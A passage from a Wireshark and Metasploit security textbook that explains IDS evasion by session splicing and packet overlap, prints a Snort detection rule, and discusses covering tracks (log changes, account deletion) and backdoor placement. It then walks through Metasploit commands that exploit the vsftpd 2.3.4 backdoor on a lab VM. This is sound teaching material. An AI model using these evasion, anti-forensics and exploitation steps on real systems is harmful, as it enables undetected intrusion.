advance which IDS was monitoring the malicious traffic. What would happen when that attacker skillfully fragments the traffic into several IP packets at the network layer (OSI layer 3)? Or when that attacker instead breaks up communications across several sessions at the application layer (OSI layers 6 or 7)?</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Dividing malicious communications across several sessions, in an effort to evade the IDS, is called </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >session splicing</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:17.2500pt;" ><a name="_bookmark473" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In recent years, intrusion detection devices have seen a big boost in intelligence as far as dealing with split sessions or fragmented sessions. The technique (that worked well until IDSes were designed to cope) was to split up a malicious attempt across multiple sessions. The IDS would pick up and analyze each session individually. Each</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section243" ><p class=MsoBodyText  style="margin-top:3.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >session was compared against strings of </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >known bad</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. Because each session (a portion of the malicious whole) was relatively benign, there was no positive hit against that traffic, and as a result it was cleared to go forward. Current IDSes are intelligent enough to recognize the potential harm and will now collect all pieces for reassembly first.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Once all the parts can be compared as a whole, then the IDS can make the more informed decision.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:9.0500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Perhaps you are already familiar with Snort, an open-source IDS. Being free, open-source, and well supported, Snort offers an excellent way to learn how to run and tune an IDS, whether in your home lab or an enterprise environment. In the following code example, you see the Snort rule created to combat session splicing.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.2000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >alert tcp $EXTERNAL_NET any -&#62; $HTTP_SERVERS 80</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.6000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >(msg:"WEB-MISC whisker</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >space splice attack"; content:"|20|"; flags:A+; dsize:1; reference:arachnids,296; classtype:attempted-recon; reference</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-right:9.6500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >What&#8217;s the hazard with this technique? The IDS, like any device, is</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.0000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >still resource bound. Maybe, just maybe your efforts can tax the IDS&#8217;s resources to the brink, forcing the IDS to forward on the traffic without a chance to</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.2500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >analyze.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.1000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Playing to the Host, Not the IDS</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Many techniques of evading an IDS or firewall come down to one method: play to the host, not to the IDS. If you can craft traffic so that the host interprets correctly but the IDS does not, then game over. By </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >correctly</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, we mean your malicious traffic takes effect on the host but has no effect on the IDS. The IDS is unable or unwilling to interpret the traffic in the same way as the host would.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Getting traffic interpreted by the host, but not the IDS, can happen in multiple ways&#8212;for example, by encrypting traffic that can be deciphered by the host but not the IDS. (The host knows the private key; the IDS does not.) Or by using specially crafted TCP sequence numbers to ensure overlap of the packets. Because operating systems will handle overlapping packets differently (accept the older information versus the newer), attackers knowledgeable of how the</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section244" ><p class=MsoBodyText  style="margin-top:3.8000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >target will handle it will use that to their advantage. While the host reassembles the packets correctly, the IDS reassembles them differently for analysis.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.0000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Covering Tracks and Placing Backdoors</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >For attackers, the last phase is to back out of the system. According to the standard methodology, this means </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >covering their tracks</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&#8212; concealing their presence <a name="_bookmark474" ></a>on the various systems. This is especially important, for example, if the attacker is changing results on a voting machine.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:17.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >But for the noisy, attention-hungry attacks, trying to hide the fact there was an attack is likely a moot point. But it&#8217;s still cool to conceal your presence at least for some areas to hide how effective or widespread the attack was.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >How much does Wireshark play into this phase? Not a lot when we are talking about covering your tracks. We&#8217;re talking about changing logs, changing details regarding file access or network connections, deleting created accounts, and so on. Not much to do regarding packet inspection. But what about those backdoors you&#8217;ll place?</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:17.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Wireshark might help with configuring or testing a backdoor. A backdoor is for your access later. What port should your backdoor be listening on? What ports wouldn&#8217;t stand out? What traffic and what port is currently allowing access across the firewall? Wireshark can obviously help answer these questions if you place it where you need to intercept and capture the traffic for analysis.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2><a name="_bookmark475" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="Exploitation" ></a>Exploitation</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This is a rather long section, divided into several parts. Overall, we cover system exploitation. To keep things safe, we practice exploits using systems in the W4SP Lab. This means the section begins with setting up the W4SP Lab.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >After setting up the lab space, we exploit a vulnerable system. You&#8217;ll be successful in some attempts and not with others. On the successful times, you&#8217;ll establish shells, or connections, with the victim. All along</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section245" ><p class=MsoBodyText  style="margin-top:4.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >the way, of course, you&#8217;re using Wireshark to verify and confirm what you assume is happening, as well as to troubleshoot when things go awry.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8500pt;margin-right:9.0500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To make use of Wireshark as a troubleshooting tool, we needed to find an exploit to be reliably troublesome. That was difficult. Given Metasploit&#8217;s strong community support and ever-improving modules, it took considerable time to find an exploit module showing an issue that lends itself to needing Wireshark. But we have one. The found exploit module is: </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >exploit/unix/ftp/vsftpd_234_backdoor</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.4000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Some quick history behind that exploit: In the summer of 2011, the downloadable archive for VSFTPD version 2.3.4 contained a malicious backdoor. If you discovered a UNIX system running that version of VSFTP, then it was fairly certain you could exploit it to gain access to that backdoor.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Luckily for you, the vulnerable </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >Metasploitable </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >image is running VSFTPD v2.3.4. And luckily for us all, the module used to connect, exploit, and establish a shell session back to you experiences some trouble. And you&#8217;ll be able to identify those issues within Wireshark.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >A quick disclaimer: While these issues exist at the time of writing, it&#8217;s possible the module might be fixed or improved once this issue gets raised to someone wanting to improve the exploit module.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.0500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Setting Up the W4SP Lab with Metasploitable</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;" ><a name="_bookmark476" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Metasploitable is an image available on the W4SP Lab. The image was created as a virtual machine (VM) for security professionals to exercise and practice their penetration skills against a vulnerable machine.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:8.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >First, ensure the W4SP Lab is running and set up. Then, find the stack of red buttons on the right side of the W4SP Lab screen. These red buttons alter or add to the base W4SP Lab to create specific environments. From </span><span><a href="#_bookmark368" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 5</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, you already performed two MitM labs, but you haven&#8217;t yet utilized the W4SP MitM customization behind these buttons. You will in this lab.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >For this experiment, you want to launch the Metasploitable image. The Metasploitable image can be started by clicking the start sploit button.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section246" ><p class=MsoBodyText  style="margin-top:3.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Once it&#8217;s started, you should see the lab network diagram refresh to show an additional blue node named </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >sploit</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. All nodes are blue, being vulnerable to some degree, except the red Kali node. If you do not see the sploit node, click Refresh to redo the diagram.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Remember, as with other nodes in the lab network diagram, if you hover over the sploit node, its IP address is provided, as shown in<a name="_bookmark477" ></a>&nbsp;</span><span><a href="#_bookmark478" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-5</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="238.75"  height="0" ></td></tr><tr><td></td><td><img width="544"  height="402"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker318291.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark478" ></a><span><a href="#_bookmark477" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-5:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Metasploitable and its IP</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.1500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Launching Metasploit Console</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You must run </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >msf </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >as root. At a new Terminal window, type </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >sudo msfconsole </span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and then enter your w4sp-lab user password when prompted. Within 20-30 seconds the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >msf &#62;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.4000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >command prompt should appear.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:13.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >If Metasploit ran earlier and the lab was shut down ungracefully (killed browser or Terminal window), you might get an error. To recover from that error, shut down the lab using the Shutdown</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >button on the left, and then relaunch the lab by running the Python</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.6000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >script.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;" ><a name="_bookmark479" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Once Metasploit Framework is running, you&#8217;ll have an MSF</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >console prompt, shown as </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >msf &#62;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. It&#8217;s time to look for the exploit we want</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.8500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section247" ><p class=MsoBodyText  style="margin-top:3.6000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >demonstrate.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2 style="margin-top:0.0500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >VSFTP Exploit</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:13.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In Metasploit, exploit modules are searchable. At the MSF prompt, you can use the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >search</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.6500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >command with any word or text string entered after the command. To find the exploit needed for this lab, type </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >search vsftpd</span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, as shown in<a name="_bookmark480" ></a>&nbsp;</span><span><a href="#_bookmark481" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-6</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="140"  height="0" ></td></tr><tr><td></td><td><img width="742"  height="495"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker319284.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:6.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.8000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark481" ></a><span><a href="#_bookmark480" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-6:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Searching for the VSFTPD exploit</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;margin-right:17.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >As mentioned previously, the Metasploitable image is vulnerable to the VSFTPD exploit, so we&#8217;ll use that against the target machine. At the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >msf </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >console prompt, type the </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >use </span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >command, followed by the exploit name. In this case, type </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >use exploit/unix/ftp/vsftpd_234_backdoor</span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.3500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You&#8217;ll see the console prompt changed, signaling MSF is currently operating with that exploit ready to go. But before running the exploit, you must set the remote host (target). Type </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >set RHOST </span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >followed by the IP address of the Metasploitable system. Once entered, type</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section248" ><p class=MsoNormal  style="margin-top:4.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >exploit </span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to launch.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.4500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This exploit module, like many others in the Metasploit Framework, will start by exploiting the vulnerable service, and then create a shell session. The shell session is a backdoor to which you can connect from your attacking machine.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >After the exploit starts, the assumption is the module then immediately creates a shell. Unfortunately, this exploit module seems not as reliable as the others. See<a name="_bookmark482" ></a>&nbsp;</span><span><a href="#_bookmark483" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-7</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to see our console output on two attempts.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="127.5"  height="0" ></td></tr><tr><td></td><td><img width="767"  height="510"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker320411.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark483" ></a><span><a href="#_bookmark482" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-7:</span></u></b><b><span 